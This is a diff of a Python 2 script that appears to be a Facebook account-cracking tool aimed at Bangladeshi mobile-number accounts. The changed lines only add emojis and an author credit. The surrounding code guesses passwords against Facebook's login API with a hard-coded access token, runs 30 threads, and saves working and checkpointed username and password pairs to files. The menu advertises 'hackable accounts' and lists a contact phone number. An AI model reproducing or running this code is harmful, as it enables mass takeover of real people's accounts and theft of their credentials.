@@ -107,7 +107,7 @@ successful = []
 cpb = []
 oks = []
 id = []
-print 'AUTHOR : BD. JAHIED'
+print 'AUTHOR : 🔥🔥BD. JAHIED/--MR.RAKIB🔥🔥'
 print 'FACEBOOK :ROOT.OFF.JAHIED'
 print 'GITHUB : BLACK-HUNTER-TEEM'
 CorrectUsername = 'BD-JAHIED'
@@ -136,16 +136,16 @@ def menu():
     print logo
     print '\x1b[1;91mONLY \x1b[1;91m08 \x1b[1;91m DIGITS HACKABLE ACCOUNTS ARE AVAILABLE'
     print
-    jalan('\x1b[1;92m[1]  \x1b[1;92mGRAMEENPHONE')
-    jalan('\x1b[1;96m[2]  \x1b[1;96mROBI')
-    jalan('\x1b[1;92m[3]  \x1b[1;92mAIRTEL')
-    jalan('\x1b[1;96m[4]  \x1b[1;96mBANGLALINK')
-    jalan('\x1b[1;92m[5]  \x1b[1;92mTELETALK')
-    jalan('\x1b[1;96m[6]  \x1b[1;96mGRAMEENPHONE \x1b[1;91m(NEW)')
-    jalan('\x1b[1;92m[7]  \x1b[1;92mBANGLALINK \x1b[1;91m(NEW)')
+    jalan('\x1b[1;92m[1]  \x1b[1;92m🔥GRAMEENPHONE🔥')
+    jalan('\x1b[1;96m[2]  \x1b[1;96m🔥ROBI🔥')
+    jalan('\x1b[1;92m[3]  \x1b[1;92m🔥AIRTEL🔥')
+    jalan('\x1b[1;96m[4]  \x1b[1;96m🔥BANGLALINK🔥')
+    jalan('\x1b[1;92m[5]  \x1b[1;92m🔥TELETALK🔥')
+    jalan('\x1b[1;96m[6]  \x1b[1;96m🔥GRAMEENPHONE🔥 \x1b[1;91m(NEW)')
+    jalan('\x1b[1;92m[7]  \x1b[1;92m🔥BANGLALINK 🔥\x1b[1;91m(NEW)')
     print
-    jalan('\x1b[1;90m[8] FIND ME ON FACEBOOK GROUP')
-    jalan('\x1b[1;90m[9] TO CONTACT +8801747951169')
+    jalan('\x1b[1;90m[8] 🇧🇩🔥FIND ME ON FACEBOOK GROUP')
+    jalan('\x1b[1;90m[9]🇧🇩🔥 TO CONTACT +8801747951169🆗')
     print
     jalan('\x1b[1;97m[00]  EXIT')
     print 50 * '-'
@@ -306,13 +306,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + c + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[OK-BHT-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
+                print '\x1b[1;92m[🆗-BHT-SUCCESSFUL🔥]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + c + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + c + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[CP-BHT-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 10 Days]\n'
+                print '\x1b[1;96m[7️⃣-BHT-CHECKPOINT😭] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 10 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + c + pass1 + '\n')
                 cps.close()
@@ -323,7 +323,7 @@ def action():
     p = ThreadPool(30)
     p.map(main, id)
     print 50 * '-'
-    print '[\xe2\x9c\x93] Process Has Been Completed....'
+    print '[\xe2\x9c\x93] Process Has Been Completed🔥....'
     print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
     print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
     raw_input('\n[Press Enter To Go Back]')
